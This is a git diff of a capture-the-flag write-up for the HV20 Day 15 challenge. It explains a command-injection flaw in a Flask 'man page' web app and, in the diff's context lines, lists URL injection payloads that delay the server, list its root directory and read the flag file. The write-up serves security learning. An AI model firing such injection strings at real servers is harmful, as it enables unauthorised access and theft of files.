@@ -1,3 +1,6 @@
+[← Day 14](../day14/) / [↑ TOC](../README.md) / [→ Day 16](../day16/)
+
+
 # Day 15 / HV20.15 Man Commands, Server Lost
 
 
@@ -5,8 +8,8 @@
 
 <!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
 * Author: inik
-* Tags:   #penetration-testing #web-security
-* Level:  hard
+* Tags:   `#penetration-testing` `#web-security`
+* Level:  Hard
 
 ### Introduction
 
@@ -39,9 +42,9 @@ The challenge's web application looks like this:
 
 ![](screenshot_man_server.png)
 
-… and here is the web app's source code:
+… and here is the web app's source code …
 
-````python
+```python
 # flask_web/app.py
 
 from flask import Flask,render_template,redirect, url_for, request
@@ -102,27 +105,28 @@ def parseCommands(ret):
 
 if __name__ == "__main__":
   app.run(host='0.0.0.0' , port=7777)
-````
+```
 
 
 ### Interpreting the attack possibilities
 
-One of the three entry points is better than the others. It's the one with 
-`@app.route('/man/')`. Through that entry point it is even possible to print
-results back to the web page as the `command` variable is not parsed there.
+<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
+One of the three entry points is better than the others for an injection. It's
+the one with `@app.route('/man/')`. Through that it is even possible to print
+results back to the web page as the `command` variable is **not** parsed there.
 
 `return render_template('manpage.html', command=command, manpage=htmlStripped)`
 
 And that means that it's not necessary to use a reverse shell contrary to what
 the challenge description says.
 
-Here follows a list of increasingly better injections:
+Here follows a list of increasingly better injections …
 
 * `/man/1/man; sleep 5; %23`
 
    Output: ``
 
-   This injection just makes the server wait for 5 seconds in order to proof
+   This injection just makes the server wait for 5 seconds in order to verify 
    that an injection is possible.
 
 * `/man/1/man; echo "oooooohhhhhhh my" ; %23`
@@ -137,7 +141,7 @@ Here follows a list of increasingly better injections:
    Output: `/ bin boot dev etc flag home lib lib64 media mnt opt […]`
 
    This injection shows that access on the remote file system works perfectly
-   except for newline characters.
+   (except for printing newline characters).
 
 * `/man/1/man; echo "12345"; cat flag; echo " "; %23`
 
@@ -149,3 +153,4 @@ Here follows a list of increasingly better injections:
 
 Flag: `HV20{D0nt_f0rg3t_1nputV4l1d4t10n!!!}`
 
+[← Day 14](../day14/) / [↑ TOC](../README.md) / [→ Day 16](../day16/)
